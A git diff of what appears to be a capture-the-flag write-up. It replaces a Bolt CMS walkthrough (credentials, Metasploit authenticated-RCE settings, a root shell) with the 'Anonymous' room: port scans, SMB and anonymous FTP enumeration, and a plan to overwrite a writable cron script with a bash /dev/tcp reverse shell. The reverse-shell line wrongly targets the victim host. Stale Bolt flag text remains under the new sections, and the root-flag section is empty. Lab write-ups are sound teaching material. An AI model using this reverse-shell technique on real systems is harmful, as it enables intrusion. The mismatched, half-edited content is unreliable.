@@ -10,14 +10,14 @@
 
 ### Task 1 - Deploy the machine
 
-🎯 Target IP: `10.10.152.217`
+🎯 Target IP: `10.10.32.229`
 
 Create a directory for machine on the Desktop and a directory containing the scans with nmap.
 
 ### Task 2 - Reconnaissance
 
 <pre class="language-bash"><code class="lang-bash">su
-echo "10.10.152.217 anonymous.thm" >> /etc/hosts
+echo "10.10.32.229 anonymous.thm" >> /etc/hosts
 
 mkdir thm/anonymous.thm  
 cd thm/anonymous.thm
@@ -31,10 +31,10 @@ I prefer to start recon by pinging the target, this allows us to check connectiv
 
 ```bash
 ping -c 3 anonymous.thm 
-PING anonymous.thm (10.10.152.217) 56(84) bytes of data.
-64 bytes from anonymous.thm (10.10.152.217): icmp_seq=1 ttl=63 time=61.7 ms
-64 bytes from anonymous.thm (10.10.152.217): icmp_seq=2 ttl=63 time=62.8 ms
-64 bytes from anonymous.thm (10.10.152.217): icmp_seq=3 ttl=63 time=62.0 ms
+PING anonymous.thm (10.10.32.229) 56(84) bytes of data.
+64 bytes from anonymous.thm (10.10.32.229): icmp_seq=1 ttl=63 time=60.8 ms
+64 bytes from anonymous.thm (10.10.32.229): icmp_seq=2 ttl=63 time=58.9 ms
+64 bytes from anonymous.thm (10.10.32.229): icmp_seq=3 ttl=63 time=58.9 ms
 ```
 
 Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.
@@ -46,18 +46,19 @@ nmap --open -p0- -n -Pn -vvv -T4 anonymous.thm
 ```
 
 ```bash
-Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-12 14:17 EDT
-Initiating SYN Stealth Scan at 14:17
-Scanning anonymous.thm (10.10.152.217) [65536 ports]
-Discovered open port 445/tcp on 10.10.152.217
-Discovered open port 21/tcp on 10.10.152.217
-Discovered open port 139/tcp on 10.10.152.217
-Discovered open port 22/tcp on 10.10.152.217
-Completed SYN Stealth Scan at 14:17, 21.16s elapsed (65536 total ports)
-Nmap scan report for anonymous.thm (10.10.152.217)
-Host is up, received user-set (0.068s latency).
-Scanned at 2023-07-12 14:17:22 EDT for 21s
-Not shown: 65532 closed tcp ports (reset)
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-12 18:16 EDT
+Initiating SYN Stealth Scan at 18:16
+Scanning anonymous.thm (10.10.32.229) [65536 ports]
+Discovered open port 21/tcp on 10.10.32.229
+Discovered open port 445/tcp on 10.10.32.229
+Discovered open port 22/tcp on 10.10.32.229
+Discovered open port 139/tcp on 10.10.32.229
+Completed SYN Stealth Scan at 18:17, 36.30s elapsed (65536 total ports)
+Nmap scan report for anonymous.thm (10.10.32.229)
+Host is up, received user-set (0.098s latency).
+Scanned at 2023-07-12 18:16:59 EDT for 37s
+Not shown: 65434 closed tcp ports (reset), 98 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT    STATE SERVICE      REASON
 21/tcp  open  ftp          syn-ack ttl 63
 22/tcp  open  ssh          syn-ack ttl 63
@@ -82,6 +83,8 @@ nmap -p21,22,139,445 -sCV -n -Pn -vvv -T4 anonymous.thm
 ```bash
 PORT    STATE SERVICE     REASON         VERSION
 21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
@@ -92,11 +95,9 @@ PORT    STATE SERVICE     REASON         VERSION
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
-|      At session startup, client count was 4
+|      At session startup, client count was 2
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
 22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
@@ -106,21 +107,14 @@ PORT    STATE SERVICE     REASON         VERSION
 |   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
 139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  Eetbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+445/tcp open              syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
 Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
-|   Computer name: anonymous
-|   NetBIOS computer name: ANONYMOUS\x00
-|   Domain name: \x00
-|   FQDN: anonymous
-|_  System time: 2023-07-12T18:19:14+00:00
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
 | smb2-time: 
-|   date: 2023-07-12T18:19:14
+|   date: 2023-07-12T22:17:54
 |_  start_date: N/A
-|_clock-skew: mean: 0s, deviation: 0s, median: -1s
 | nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 | Names:
 |   ANONYMOUS<00>        Flags: <unique><active>
@@ -134,6 +128,16 @@ Host script results:
 |   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
 |   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
 |_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: anonymous
+|   NetBIOS computer name: ANONYMOUS\x00
+|   Domain name: \x00
+|   FQDN: anonymous
+|_  System time: 2023-07-12T22:17:54+00:00
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
@@ -141,19 +145,18 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 | p2p-conficker: 
 |   Checking for Conficker.C or higher...
-|   Check 1 (port 62414/tcp): CLEAN (Couldn't connect)
-|   Check 2 (port 16939/tcp): CLEAN (Couldn't connect)
-|   Check 3 (port 25266/udp): CLEAN (Failed to receive data)
-|   Check 4 (port 29472/udp): CLEAN (Failed to receive data)
+|   Check 1 (port 63881/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 37451/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 33823/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 56889/udp): CLEAN (Failed to receive data)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
 ```
 
 ```bash
 PORT    STATE SERVICE     REASON         VERSION
 21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
@@ -164,11 +167,9 @@ PORT    STATE SERVICE     REASON         VERSION
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
-|      At session startup, client count was 4
+|      At session startup, client count was 2
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
 ```
 
 {% hint style="info" %}
@@ -188,140 +189,108 @@ SMB
 
 ### 2.4 - There's a share on the user's computer.  What's it called? 
 
-\
-
-
-###
-
-### &#x20;
-
-\
-
-
-
-
-
-
-
-
-
-
-\
-
-
-
-
-
-
-
-
-
-
-
-
-#### 3.2 - What port number has a web server with a CMS running?
-
-<figure><img src=".gitbook/assets/Schermata del 2023-06-30 22-42-14.png" alt=""><figcaption><p><a href="http://bolt.thm:8000/">http://bolt.thm:8000/</a></p></figcaption></figure>
-
-{% hint style="info" %}
-8000
-{% endhint %}
-
-#### 3.3 - What is the username we can find in the CMS?
-
-{% hint style="info" %}
-Bolt
-{% endhint %}
-
-#### 3.4 - What is the password we can find for the username? 
-
-<figure><img src=".gitbook/assets/Schermata del 2023-06-30 23-21-11.png" alt=""><figcaption></figcaption></figure>
-
-{% hint style="info" %}
-boltadmin123
-{% endhint %}
-
-#### 3.5 - What version of the CMS is installed on the server? (Ex: Name 1.1.1)
-
-Googling info about Bolt cms we found that panel is usually at location:&#x20;
-
-IP/bolt/login, than we go to: [http://bolt.thm:8000/bolt/login](http://bolt.thm:8000/bolt/login)&#x20;
-
-<figure><img src=".gitbook/assets/Schermata del 2023-06-30 23-23-18.png" alt=""><figcaption></figcaption></figure>
-
-and we log in with our credentials: bolt::boltadmin123
-
-#### 3.6 - There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
-
-We can use searchsploit to find most famous exploit for bolt cms:
+```bash
+smbmap -H anonymous.thm
+```
 
 ```bash
-searchsploit bolt                   
------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------- ---------------------------------
-Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer Overflow                        | multiple/dos/41869.html
-Bolt CMS 3.6.10 - Cross-Site Request Forgery                                                    | php/webapps/47501.txt
-Bolt CMS 3.6.4 - Cross-Site Scripting                                                           | php/webapps/46495.txt
-Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution                             | php/webapps/46664.html
-Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                            | php/webapps/48296.py
-Bolt CMS < 3.6.2 - Cross-Site Scripting                                                         | php/webapps/46014.txt
-Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow                                         | multiple/remote/24982.txt
-BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                     | php/webapps/36552.txt
-BoltWire 6.03 - Local File Inclusion                                                            | php/webapps/48411.txt
-Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities                                     | php/webapps/21132.txt
-CMS Bolt - Arbitrary File Upload (Metasploit)                                                   | php/remote/38196.rb
------------------------------------------------------------------------------------------------- ---------------------------------
+[+] Guest session   	IP: anonymous.thm:445	Name: unknown                                           
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	pics                                              	READ ONLY	My SMB Share Directory for Pics
+	IPC$                                              	NO ACCESS	IPC Service (anonymous server (Samba, Ubuntu))
 ```
 
-Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                            | php/webapps/48296.py\
+We can see that the share's name is:\
+
+
+{% hint style="info" %}
+pics
+{% endhint %}
+
+### 2.5 - Find user flag
+
 \
-EDB-ID is:
+Now, we explore others open ports starting with FTP (21):
 
-{% hint style="info" %}
-48296
-{% endhint %}
-
-#### 3.7 - Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
-
-Now we launch msfconsole to find exploit path:
-
+```bash
+ftp anonymous.thm
 ```
 
-msf6 exploit(unix/webapp/bolt_authenticated_rce) > search bolt
-
-Matching Modules
-================
-
-   #  Name                                        Disclosure Date  Rank       Check  Description
-   -  ----                                        ---------------  ----       -----  -----------
-   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great      Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
-   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
+```bash
+Connected to anonymous.thm.
+220 NamelessOne's FTP Server!
+Name (anonymous.thm:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||22172|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
 ```
 
-{% hint style="info" %}
+We see that scripts directory has all permessions, jump in!
+
+```bash
+ftp> cd scripts
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||63113|)
+150 Here comes the directory listing.
+-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
+-rw-rw-r--    1 1000     1000         2709 Jul 12 22:43 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
 ```
-exploit/unix/webapp/bolt_authenticated_rce
+
+Save all them using get command:
+
+```bash
+ftp> get clean.sh
+local: clean.sh remote: clean.sh
+229 Entering Extended Passive Mode (|||51458|)
+150 Opening BINARY mode data connection for clean.sh (314 bytes).
+100% |***********************************************************************|   314       67.54 KiB/s    00:00 ETA
+226 Transfer complete.
+314 bytes received in 00:00 (4.81 KiB/s)
+ftp> get removed_files.log
+local: removed_files.log remote: removed_files.log
+229 Entering Extended Passive Mode (|||56452|)
+150 Opening BINARY mode data connection for removed_files.log (2752 bytes).
+100% |***********************************************************************|  2752        6.37 MiB/s    00:00 ETA
+226 Transfer complete.
+2752 bytes received in 00:00 (43.09 KiB/s)
+ftp> get to_do.txt
+local: to_do.txt remote: to_do.txt
+229 Entering Extended Passive Mode (|||61628|)
+150 Opening BINARY mode data connection for to_do.txt (68 bytes).
+100% |***********************************************************************|    68      400.03 KiB/s    00:00 ETA
+226 Transfer complete.
+68 bytes received in 00:00 (1.08 KiB/s)
+ftp> quit
+221 Goodbye.
 ```
-{% endhint %}
 
-#### 3.8 - Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
+Using cat, we can read files:
 
-* RHOST is the ip of the machine
-* LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
-* USERNAME and PASSWORD is that we found in previous enumeration
-* TARGETURI is where you want to put our website url. here its bolt website in port 8000
+<figure><img src=".gitbook/assets/Schermata del 2023-07-13 01-32-54.png" alt=""><figcaption></figcaption></figure>
 
-<pre class="language-bash"><code class="lang-bash"><strong>set RHOST bolt.thm
-</strong><strong>set LHOST tun0
-</strong>set USERNAME bolt
-set PASSWORD boltadmin123
-exploit
-</code></pre>
+Focusing on clean.sh file (that have all permissions), we can erase the bucket and put into a reverse shell script (re-uploading it).
 
-<figure><img src=".gitbook/assets/Schermata del 2023-07-02 11-20-50.png" alt=""><figcaption><p>root shell</p></figcaption></figure>
+We found reverse shell scripts on [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and we save it into a new file with duplicate name: clean.sh:
 
-#### 3.9 - Look for flag.txt inside the machine.
+```bash
+bash -i >& /dev/tcp/anonymous.thm/4444 0>&1
+```
+
+
+
+
+
+
 
 flag is usually in the path: /home
 
@@ -352,3 +321,20 @@ cat /root/flag.txt
 THM{wh0\_d035nt\_l0ve5\_b0l7\_r1gh7?}
 
 </details>
+
+
+
+
+
+
+
+
+
+### 2.6 - Find root flag
+
+
+
+
+
+
+
